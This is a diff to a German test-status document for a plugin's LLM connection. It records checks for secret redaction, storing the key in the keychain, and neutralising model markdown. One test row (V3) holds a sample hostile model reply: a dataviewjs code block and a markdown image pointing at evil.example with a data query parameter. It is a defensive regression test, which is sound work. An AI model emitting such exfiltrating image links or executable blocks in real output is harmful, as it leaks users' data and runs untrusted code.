@@ -116,11 +116,16 @@ Rollbereich geworden; C9/C9b tragen seitdem eine andere Frage, C11/C11b/C9c sind
 | C11b | Hochscrollen im Strom wird respektiert | mitten im Strom künstlich `scrollTop = 0`; danach darf das Kit **nicht** mehr nachziehen | grün (3 Messungen, größter Stand 0 px) | 2026-09-11 |
 | S1 | Fake-Manager liefert den Apple-Endpunkt nur bei Opt-in | `list({capability})` ohne, `list({…, transports:["http","shortcuts"]})` mit Apple — misst den Fake selbst, damit S2 nicht grün wird, ohne dass das Opt-in je gebraucht wurde | grün | 2026-10-01 |
 | S2 | Dropdown zeigt „Apple Intelligence (on-device)“ | Optionen der Endpunkt-Auswahl im Settings-Tab (`transports`-Option des Kit-Bausteins) | grün | 2026-10-01 |
-| S3 | Wahl → Quelle traegt `transport: "shortcuts"` | Dropdown wie ein Nutzer setzen (`change`), dann `isShortcutsEndpoint()`; der Hinweis zu den Grenzen („4096“) steht im Tab | grün | 2026-10-01 |
+| S3 | Wahl → Quelle traegt `transport: "shortcuts"` | Dropdown wie ein Nutzer setzen (`change`), dann `llm.resolve()` (`transport === "shortcuts"`); der Hinweis zu den Grenzen („4096“) steht im Tab | grün | 2026-10-01 |
 | S4 | Lauf öffnet die `shortcuts://`-URL mit dem gefalteten Prompt | `window.open` **vor** dem Klick gestubbt (sonst öffnet die Zweitinstanz die Kurzbefehle-App), im `finally` zurückgebaut; URL beginnt mit `shortcuts://`, trägt den Namen und den Prompt | grün | 2026-10-01 |
 | S5 | Zeitüberschreitung zeigt die Kurzbefehl-Meldung | Kurzbefehl-Frist 3 s, kein Callback: Status `is-error`, Text nennt „Apple Intelligence“, kein „(408)“ | grün | 2026-10-01 |
+| V1 | Token geht als Platzhalter an den Server, im Ergebnis steht das Original | Fake-Server zeichnet den Body auf und spiegelt den Platzhalter, den er sah; Eingabe über `api.tune` mit `Bearer <≥16 Zeichen>`: im Body kein Original, ein `[redacted-…]`, im Ergebnis das Original zurück | grün | 2026-10-09 |
+| V2 | Schlüssel steht nicht mehr in `data.json`, der Server bekommt ihn trotzdem | Endpunkt **mit** Klartext-Schlüssel setzen, `llm.resolve({ force: true })`, dann `data.json` lesen: kein Schlüssel, `secretId` da; am Server `Authorization: Bearer <Schlüssel>` | grün | 2026-10-09 |
+| V3 | Antwort mit Code-Block-Prozessor und Bild rendert als Text | Panel-Lauf, der Server antwortet mit einem ```` ```dataviewjs ````-Block und `![x](https://evil.example/?d=…)`: im `.okit-stream-body` kein `img`, kein `pre`, der Text zeigt „dataviewjs“ | grün | 2026-10-09 |
 
-**Bilanz des letzten Laufs: 29 grün · 0 rot · 1 übersprungen — von 30 Prüfpunkten.**
+**Bilanz des letzten Laufs (Welle 15, 2026-10-09, nach dem Verbindungs-Tausch auf Kit 0.51.2): 49 grün · 0 rot · 2 übersprungen — von 51 Prüfpunkten** (Baseline davor: 46 grün · 0 rot · 2 übersprungen — von 48; dazu V1–V3). Übersprungen: C8 (das gewählte Modell liefert bei ausgeschaltetem Denken keinen Gedankenstrom) und „Markierung ersetzen“ (Handarbeit).
+
+(Stand der Tabelle davor: 29 grün · 0 rot · 1 übersprungen — von 30 Prüfpunkten.)
 (Vorlauf 2026-09-08, vor dem Kit-Umbau: 25 grün · 0 rot · 1 übersprungen von 26.)
 
 ⚠️ **Der Messtakt von C11/C11b stand auf 300 ms und war damit zu grob.** Die Antwort auf die
@@ -283,6 +288,15 @@ Der Chat-Client aus Kit 0.43.0 wiederholt nach einer Origin-/CORS-Weigerung des 
 
 - Der Renderer meldet dabei zwei erwartete Fehlerzeilen (CORS-Preflight, `net::ERR_FAILED`); sie stehen als `WARNUNG` in der Bilanz und sind hier die Ursache, kein Befund.
 - Gegenprobe (2026-09-26): mit CORS-Headern am Fake-Server ist F1 rot (`stream im Body: true`), ohne sie grün.
+
+### V1–V3 — die Verbindung des Kits (seit 2026-10-09)
+
+Seit dem Verbindungs-Tausch (Kit 0.51.2, `createLlmConnection`) schwärzt der Chat-Client Geheimnisse vor dem Senden (umkehrbar), der Schlüssel liegt im Schlüsselbund, und Modell-Markdown wird vor dem Rendern neutralisiert. Gemessen wird die **Wirkung**, nicht der Aufruf: ein eigener Fake-Server zeichnet auf, was auf den Draht ging (Body, `Authorization`).
+
+- Der Lauf braucht kein Modell in LM Studio (eigener Fake-Server wie F1, mit CORS-Headern).
+- V2 setzt vorher einen Endpunkt **mit** Schlüssel (ein Staging-Vault ohne Schlüssel misst sonst nichts) und stellt die Endpunkt-Liste im `finally` zurück.
+- Gegenprobe (2026-10-09): mit `redact: false`, einem `persist`, das nicht speichert, und ohne Neutralisierung (`raw: true`, Vorschau ohne `neutralizeModelMarkdown`) sind V1, V2 und V3 rot (46 grün · 3 rot · 2 übersprungen), ohne diese Änderungen grün (49 · 0 · 2).
+- C1 und die C-Folgepunkte hängen am echten Modell auf `:1234`. Ist LM Studio durch andere Läufe ausgelastet (gemessen: 20 Tokens in 31 s statt 2,6 s), fällt C1 durch einen Timeout und M2 bricht mit ab (33 grün · 2 rot · 12 übersprungen) — das ist die Umgebung, nicht das Plugin: vor dem Lauf die Antwortzeit messen.
 
 ## Bewusst übersprungene Punkte
 
